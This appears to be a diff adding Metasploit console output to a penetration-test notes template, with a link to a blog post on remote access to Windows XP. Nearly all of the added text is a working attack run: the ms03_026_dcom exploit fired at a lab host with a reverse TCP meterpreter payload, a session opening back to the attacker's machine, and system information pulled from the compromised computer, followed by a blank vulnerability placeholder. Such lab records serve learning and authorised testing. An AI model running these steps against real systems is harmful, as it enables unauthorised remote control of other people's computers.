@@ -1,6 +1,35 @@
 https://cyruslab.net/2012/03/06/metasploit-gaining-remote-access-to-windows-xp/
 
 
+msf exploit(ms03_026_dcom) > SET PAYLOAD windows/meterpreter/reverse_tcp
+[-] Unknown command: SET.
+msf exploit(ms03_026_dcom) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(ms03_026_dcom) > set RHOST 192.168.0.33
+RHOST => 192.168.0.33
+msf exploit(ms03_026_dcom) > set LHOST 192.168.0.129
+LHOST => 192.168.0.129
+msf exploit(ms03_026_dcom) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.129:4444 
+[*] 192.168.0.33:135 - Trying target Windows NT SP3-6a/2000/XP/2003 Universal...
+[*] 192.168.0.33:135 - Binding to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.0.33[135] ...
+[*] 192.168.0.33:135 - Bound to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.0.33[135] ...
+[*] 192.168.0.33:135 - Sending exploit ...
+[*] Sending stage (179267 bytes) to 192.168.0.33
+[*] Meterpreter session 1 opened (192.168.0.129:4444 -> 192.168.0.33:1032) at 2017-12-07 13:09:45 -0500
+
+meterpreter > sysinfo
+Computer        : UNIVERSI-Q2S87T
+OS              : Windows XP (Build 2600, Service Pack 1).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter >
+
+
 Potential Vulnerability:
 
 	DESCRIPTION, CVE, PORT etc. GOES HERE
